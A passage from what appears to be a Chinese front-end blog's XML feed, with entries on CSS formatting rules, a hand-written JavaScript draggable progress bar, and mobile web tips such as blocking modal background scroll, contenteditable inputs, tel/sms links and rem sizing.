transition等)</p><p>10.排版规范<br>(1)使用4个空格，而不使用tab或者混用空格+tab作为缩进；<br>(2)规则可以写成单行，或者多行，但是整个文件内的规则排版必须统一；</p><p>单行形式书写风格的排版约束</p><ul><li>如果是在html中写内联的css，则必须写成单行；</li><li>每一条规则的大括号 { 前后加空格 ；</li><li>每一条规则结束的大括号 } 前加空格；</li><li>属性名冒号之前不加空格，冒号之后加空格；</li><li>每一个属性值后必须添加分号; 并且分号后空格；</li><li>多个selector共用一个样式集，则多个selector必须写成多行形式 ；</li></ul><p>多行形式书写风格的排版约束</p><ul><li>每一条规则的大括号 { 前添加空格;</li><li>多个selector共用一个样式集，则多个selector必须写成多行形式 ;</li><li>每一条规则结束的大括号 } 必须与规则选择器的第一个字符对齐 ;</li><li>属性名冒号之前不加空格，冒号之后加空格;</li><li>属性值之后添加分号;</li></ul><p>11.更新中</p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>分享一个自己用原生js写的滚动条</title>
      <link href="/Blog/2017/12/21/essay/%E5%88%86%E4%BA%AB%E4%B8%80%E4%B8%AA%E8%87%AA%E5%B7%B1%E7%94%A8%E5%8E%9F%E7%94%9Fjs%E5%86%99%E7%9A%84%E6%BB%9A%E5%8A%A8%E6%9D%A1/index/"/>
      <url>/Blog/2017/12/21/essay/%E5%88%86%E4%BA%AB%E4%B8%80%E4%B8%AA%E8%87%AA%E5%B7%B1%E7%94%A8%E5%8E%9F%E7%94%9Fjs%E5%86%99%E7%9A%84%E6%BB%9A%E5%8A%A8%E6%9D%A1/index/</url>
      
        <content type="html"><![CDATA[<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="selector-class">.kuang</span> &#123;</span></span><br><span class="line"><span class="language-css"><span class="attribute">width</span>: <span class="number">700px</span>;</span></span><br><span class="line"><span class="language-css"><span class="attribute">height</span>: <span class="number">7px</span>;</span></span><br><span class="line"><span class="language-css"><span class="comment">/* background: #c03; */</span></span></span><br><span class="line"><span class="language-css"><span class="attribute">border</span>: <span class="number">1px</span> solid <span class="number">#000</span>;</span></span><br><span class="line"><span class="language-css"><span class="attribute">position</span>: relative;</span></span><br><span class="line"><span class="language-css"><span class="attribute">border-radius</span>: <span class="number">7px</span>;</span></span><br><span class="line"><span class="language-css"><span class="comment">/* margin-left: 30%; */</span></span></span><br><span class="line"><span class="language-css"><span class="comment">/* margin-top: 20%; */</span></span></span><br><span class="line"><span class="language-css"><span class="attribute">box-sizing</span>: border-box;</span></span><br><span class="line"><span class="language-css"><span class="comment">/*overflow: hidden;*/</span></span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"><span class="selector-class">.overflow</span> &#123;</span></span><br><span class="line"><span class="language-css"><span class="attribute">overflow</span>: hidden;</span></span><br><span class="line"><span class="language-css"><span class="attribute">width</span>: <span class="number">700px</span>;</span></span><br><span class="line"><span class="language-css"><span class="attribute">height</span>: <span class="number">7px</span>;</span></span><br><span class="line"><span class="language-css"><span class="attribute">border-radius</span>: <span class="number">7px</span>;;</span></span><br><span class="line"><span class="language-css"><span class="attribute">position</span>: absolute;</span></span><br><span class="line"><span class="language-css"><span class="attribute">left</span>: -<span class="number">1px</span>;</span></span><br><span class="line"><span class="language-css"><span class="attribute">top</span>: -<span class="number">1px</span>;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"><span class="selector-class">.bg</span> &#123;</span></span><br><span class="line"><span class="language-css"><span class="attribute">position</span>: absolute;</span></span><br><span class="line"><span class="language-css"><span class="attribute">background-color</span>: pink;</span></span><br><span class="line"><span class="language-css"><span class="comment">/* border-radius: 30px; */</span></span></span><br><span class="line"><span class="language-css"><span class="attribute">width</span>: <span class="number">700px</span>;</span></span><br><span class="line"><span class="language-css"><span class="attribute">height</span>: <span class="number">9px</span>;</span></span><br><span class="line"><span class="language-css"><span class="attribute">top</span>: -<span class="number">1px</span>;</span></span><br><span class="line"><span class="language-css"><span class="attribute">left</span>: -<span class="number">100%</span>;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"><span class="selector-class">.dot</span> &#123;</span></span><br><span class="line"><span class="language-css"><span class="attribute">position</span>: absolute;</span></span><br><span class="line"><span class="language-css"><span class="attribute">display</span>: inline-block;</span></span><br><span class="line"><span class="language-css"><span class="attribute">width</span>: <span class="number">16px</span>;</span></span><br><span class="line"><span class="language-css"><span class="attribute">height</span>: <span class="number">16px</span>;</span></span><br><span class="line"><span class="language-css"><span class="attribute">border-radius</span>: <span class="number">50%</span>;</span></span><br><span class="line"><span class="language-css"><span class="attribute">background</span>: pink;</span></span><br><span class="line"><span class="language-css"><span class="attribute">top</span>: <span class="number">50%</span>;</span></span><br><span class="line"><span class="language-css"><span class="attribute">left</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css"><span class="attribute">transform</span>: <span class="built_in">translate</span>(-<span class="number">50%</span>,-<span class="number">50%</span>);</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;kuang&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;overflow&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;bg&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">&quot;dot&quot;</span> <span class="attr">draggable</span>=<span class="string">&quot;false&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;line&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">window</span>.<span class="property">onload</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> kuang = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&quot;.kuang&quot;</span>);</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> dot = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;.dot&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> bg = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;.bg&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> load1 = kuang.<span class="property">clientWidth</span> * <span class="number">0.1666</span>;</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> load2 = kuang.<span class="property">clientWidth</span> * <span class="number">0.3333</span>;</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> load3 = kuang.<span class="property">clientWidth</span> * <span class="number">0.5</span>;</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> load4 = kuang.<span class="property">clientWidth</span> * <span class="number">0.6666</span>;</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> load5 = kuang.<span class="property">clientWidth</span> * <span class="number">0.8333</span>;</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> load6 = kuang.<span class="property">clientWidth</span>;</span></span><br><span class="line"><span class="language-javascript">dot.<span class="property">onmousedown</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">document</span>.<span class="property">onmousemove</span> = <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> e = e || <span class="variable language_">window</span>.<span class="property">event</span>;</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> x = e.<span class="property">clientX</span>;</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> y = e.<span class="property">clientY</span>;</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> mx = x - kuang.<span class="property">offsetLeft</span>;</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> my = y - kuang.<span class="property">offsetTop</span>;</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">if</span>(mx &lt; load1) &#123;</span></span><br><span class="line"><span class="language-javascript">dot.<span class="property">style</span>.<span class="property">left</span> = <span class="number">0</span>;</span></span><br><span class="line"><span class="language-javascript">bg.<span class="property">style</span>.<span class="property">left</span> = -load6 + <span class="string">&#x27;px&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">&#125; <span class="keyword">else</span> <span class="keyword">if</span>(mx &gt; load1 &amp;&amp; mx &lt; load3) &#123;</span></span><br><span class="line"><span class="language-javascript">dot.<span class="property">style</span>.<span class="property">left</span> = load2 + <span class="string">&#x27;px&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">bg.<span class="property">style</span>.<span class="property">left</span> = -load4 + <span class="string">&#x27;px&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">&#125; <span class="keyword">else</span> <span class="keyword">if</span>(mx &gt; load3 &amp;&amp; mx &lt; load5) &#123;</span></span><br><span class="line"><span class="language-javascript">dot.<span class="property">style</span>.<span class="property">left</span> = load4 + <span class="string">&#x27;px&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">bg.<span class="property">style</span>.<span class="property">left</span> = -load2 + <span class="string">&#x27;px&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">&#125; <span class="keyword">else</span> <span class="keyword">if</span>(mx &gt; load5) &#123;</span></span><br><span class="line"><span class="language-javascript">dot.<span class="property">style</span>.<span class="property">left</span> = load6 + <span class="string">&#x27;px&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">bg.<span class="property">style</span>.<span class="property">left</span> = <span class="number">0</span>;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">window</span>.<span class="property">getSelection</span> ? <span class="variable language_">window</span>.<span class="title function_">getSelection</span>().<span class="title function_">removeAllRanges</span>() : <span class="variable language_">document</span>.<span class="property">selection</span>.<span class="title function_">empty</span>();</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript">kuang.<span class="property">onclick</span> = <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> e = e || <span class="variable language_">window</span>.<span class="property">event</span>;</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> x = e.<span class="property">clientX</span>;</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> y = e.<span class="property">clientY</span>;</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> mx = x - kuang.<span class="property">offsetLeft</span>;</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> my = y - kuang.<span class="property">offsetTop</span>;</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">if</span>(mx &lt; load1) &#123;</span></span><br><span class="line"><span class="language-javascript">dot.<span class="property">style</span>.<span class="property">left</span> = <span class="number">0</span>;</span></span><br><span class="line"><span class="language-javascript">bg.<span class="property">style</span>.<span class="property">left</span> = -load6 + <span class="string">&#x27;px&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">&#125; <span class="keyword">else</span> <span class="keyword">if</span>(mx &gt; load1 &amp;&amp; mx &lt; load3) &#123;</span></span><br><span class="line"><span class="language-javascript">dot.<span class="property">style</span>.<span class="property">left</span> = load2 + <span class="string">&#x27;px&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">bg.<span class="property">style</span>.<span class="property">left</span> = -load4 + <span class="string">&#x27;px&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">&#125; <span class="keyword">else</span> <span class="keyword">if</span>(mx &gt; load3 &amp;&amp; mx &lt; load5) &#123;</span></span><br><span class="line"><span class="language-javascript">dot.<span class="property">style</span>.<span class="property">left</span> = load4 + <span class="string">&#x27;px&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">bg.<span class="property">style</span>.<span class="property">left</span> = -load2 + <span class="string">&#x27;px&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">&#125; <span class="keyword">else</span> <span class="keyword">if</span>(mx &gt; load5) &#123;</span></span><br><span class="line"><span class="language-javascript">dot.<span class="property">style</span>.<span class="property">left</span> = load6 + <span class="string">&#x27;px&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">bg.<span class="property">style</span>.<span class="property">left</span> = <span class="number">0</span>;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">document</span>.<span class="property">onmouseup</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">document</span>.<span class="property">onmousemove</span> = <span class="literal">null</span>;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"><span class="comment">/*移动端try*/</span></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">function</span> <span class="title function_">touchmove</span>(<span class="params">event</span>) &#123;</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> touch = event.<span class="property">targetTouches</span>[<span class="number">0</span>];</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> mx = touch.<span class="property">pageX</span> - kuang.<span class="property">offsetLeft</span>;</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">if</span>(event.<span class="property">targetTouches</span>.<span class="property">length</span> == <span class="number">1</span>) &#123;　　　　</span></span><br><span class="line"><span class="language-javascript">event.<span class="title function_">preventDefault</span>();</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">if</span>(mx &lt; load1) &#123;</span></span><br><span class="line"><span class="language-javascript">dot.<span class="property">style</span>.<span class="property">left</span> = <span class="number">0</span>;</span></span><br><span class="line"><span class="language-javascript">bg.<span class="property">style</span>.<span class="property">left</span> = -load6 + <span class="string">&#x27;px&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">&#125; <span class="keyword">else</span> <span class="keyword">if</span>(mx &gt; load1 &amp;&amp; mx &lt; load3) &#123;</span></span><br><span class="line"><span class="language-javascript">dot.<span class="property">style</span>.<span class="property">left</span> = load2 + <span class="string">&#x27;px&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">bg.<span class="property">style</span>.<span class="property">left</span> = -load4 + <span class="string">&#x27;px&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">&#125; <span class="keyword">else</span> <span class="keyword">if</span>(mx &gt; load3 &amp;&amp; mx &lt; load5) &#123;</span></span><br><span class="line"><span class="language-javascript">dot.<span class="property">style</span>.<span class="property">left</span> = load4 + <span class="string">&#x27;px&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">bg.<span class="property">style</span>.<span class="property">left</span> = -load2 + <span class="string">&#x27;px&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">&#125; <span class="keyword">else</span> <span class="keyword">if</span>(mx &gt; load5) &#123;</span></span><br><span class="line"><span class="language-javascript">dot.<span class="property">style</span>.<span class="property">left</span> = load6 + <span class="string">&#x27;px&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">bg.<span class="property">style</span>.<span class="property">left</span> = <span class="number">0</span>;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">function</span> <span class="title function_">touchstart</span>(<span class="params">e</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">kuang.<span class="title function_">addEventListener</span>(<span class="string">&#x27;touchmove&#x27;</span>, touchmove, <span class="literal">false</span>);</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript">dot.<span class="title function_">addEventListener</span>(<span class="string">&quot;touchstart&quot;</span>, touchstart, <span class="literal">false</span>);</span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">document</span>.<span class="title function_">addEventListener</span>(<span class="string">&quot;touchend&quot;</span>, <span class="keyword">function</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="comment">//dot.removeEventListener(&quot;touchstart&quot;,touchstart,false);  </span></span></span><br><span class="line"><span class="language-javascript">kuang.<span class="title function_">removeEventListener</span>(<span class="string">&quot;touchmove&quot;</span>, touchmove, <span class="literal">false</span>);</span></span><br><span class="line"><span class="language-javascript">&#125;);</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>其中有注意的问题！！！</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="property">getSelection</span> ? <span class="variable language_">window</span>.<span class="title function_">getSelection</span>().<span class="title function_">removeAllRanges</span>() : <span class="variable language_">document</span>.<span class="property">selection</span>.<span class="title function_">empty</span>();  <span class="comment">//实现元素拖动时，出现禁止图标。</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>移动开发时遇到的一些小问题总结</title>
      <link href="/Blog/2017/12/21/day_thinking/%E7%A7%BB%E5%8A%A8%E5%BC%80%E5%8F%91%E6%97%B6%E9%81%87%E5%88%B0%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E9%97%AE%E9%A2%98%E6%80%BB%E7%BB%93/index/"/>
      <url>/Blog/2017/12/21/day_thinking/%E7%A7%BB%E5%8A%A8%E5%BC%80%E5%8F%91%E6%97%B6%E9%81%87%E5%88%B0%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E9%97%AE%E9%A2%98%E6%80%BB%E7%BB%93/index/</url>
      
        <content type="html"><![CDATA[<p>1、弹出模态框，底部内容禁止滑动。</p><p>一开始想到的就是点击按钮，模态框出现时，给body内容加上overflow：hidden，在谷歌模拟器上这样是没有问题的，但是真机测试中不行，需要在当前模态框中加入</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="string">&#x27;模态框&#x27;</span>).on(<span class="string">&#x27;touchmove&#x27;</span>, <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line"></span><br><span class="line">    e.preventDefault();</span><br><span class="line"></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>这个问题在移动开发中经常遇到，网上也有很多解决方法，但是今天终于找到便捷的解决方法了！</p><p>2、可输入的div</p><p>应用场景：在表单页面，需要输入文字很多的文本框，input不能换行，textarea虽然可以，但是它的高度不能随文本增加而增高（当然js可以实现），但是可以css实现的就不需要js了</p><p>处理方法：给div增加 contenteditable&#x3D;”true” 属性，但无法去除从网页粘贴过来内容的格式，用contenteditable&#x3D;”plaintext-only”，既可以只粘贴文字了,需要注意的是，在ios中，需要给当前元素加-webkit-user-select:text；属性，否则，会弹出软键盘，但是输入不了文字。</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">&lt;!</span><span class="type">DOCTYPE</span> html<span class="operator">&gt;</span></span><br><span class="line"><span class="operator">&lt;</span>html<span class="operator">&gt;</span></span><br><span class="line">    <span class="operator">&lt;</span>head<span class="operator">&gt;</span></span><br><span class="line">        <span class="operator">&lt;</span>meta http<span class="operator">-</span>equiv<span class="operator">=</span><span class="string">&quot;content-type&quot;</span> content<span class="operator">=</span><span class="string">&quot;text/html; charset=utf-8&quot;</span> <span class="operator">/&gt;</span></span><br><span class="line">        <span class="operator">&lt;</span>title<span class="operator">&gt;&lt;/</span>title<span class="operator">&gt;</span></span><br><span class="line">        <span class="operator">&lt;</span>style type<span class="operator">=</span><span class="string">&quot;text/css&quot;</span><span class="operator">&gt;</span></span><br><span class="line">            div&#123;</span><br><span class="line">                width:300px;</span><br><span class="line">                border:1px solid #<span class="number">666</span>;</span><br><span class="line">                font<span class="operator">-</span>size:20px;</span><br><span class="line">                color:blue;</span><br><span class="line">                line<span class="operator">-</span>height:40px;</span><br><span class="line">                outline: none;</span><br><span class="line">       </span><br><span class="line">              padding: 10px;</span><br><span class="line">            &#125;</span><br><span class="line">            div:empty:before&#123;</span><br><span class="line">               content: attr(placeholder);</span><br><span class="line">               color:#ccc;</span><br><span class="line">            &#125;</span><br><span class="line">            div:focus:before&#123;</span><br><span class="line">               content:none;</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="operator">&lt;/</span>style<span class="operator">&gt;</span></span><br><span class="line">    <span class="operator">&lt;/</span>head<span class="operator">&gt;</span></span><br><span class="line">    <span class="operator">&lt;</span>body<span class="operator">&gt;</span></span><br><span class="line">        <span class="operator">&lt;</span>div contenteditable<span class="operator">=</span><span class="string">&quot;plaintext-only&quot;</span> placeholder<span class="operator">=</span><span class="string">&quot;请输入内容&quot;</span><span class="operator">&gt;&lt;/</span>div<span class="operator">&gt;</span></span><br><span class="line">    <span class="operator">&lt;/</span>body<span class="operator">&gt;</span></span><br><span class="line"><span class="operator">&lt;/</span>html<span class="operator">&gt;</span></span><br></pre></td></tr></table></figure><p>3、 打电话,发短信</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;tel:0755-10086&quot;</span>&gt;</span>打电话给:0755-10086<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;sms:10086&quot;</span>&gt;</span>发短信给: 10086<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>4、rem px 移动端适配问题<br>移动端字体单位font-size选择px还是rem<br>　　对于只需要适配少部分手机设备，且分辨率对页面影响不大的，使用px即可<br>　　对于需要适配各种移动设备，使用rem，例如只需要适配iPhone和iPad等分辨率差别比较大的设备</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@media</span> screen and (max<span class="operator">-</span>width: 321px) &#123;</span><br><span class="line">    body &#123;</span><br><span class="line">        font<span class="operator">-</span>size: 16px;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">@media</span> screen and (min<span class="operator">-</span>width: 321px) and (max<span class="operator">-</span>width: 400px) &#123;</span><br><span class="line">    body &#123;</span><br><span class="line">        font<span class="operator">-</span>size: 17px;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">@media</span> screen and (min<span class="operator">-</span>width: 400px) &#123;</span><br><span class="line">    body &#123;</span><br><span class="line">        font<span class="operator">-</span>size: 19px;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="operator">&lt;</span>script<span class="operator">&gt;</span></span><br><span class="line">    <span class="comment">// px与rem单位的换算</span></span><br><span class="line">    (function()&#123;</span><br><span class="line">        document.documentElement.style.fontSize <span class="operator">=</span> document.documentElement.clientWidth <span class="operator">/</span> <span class="number">7.5</span> <span class="operator">+</span> &#x27;px&#x27;;</span><br><span class="line">    &#125;)();</span><br><span class="line"><span class="operator">&lt;/</span>script<span class="operator">&gt;</span></span><br></pre></td></tr></table></figure><p>5、移动端 1px border 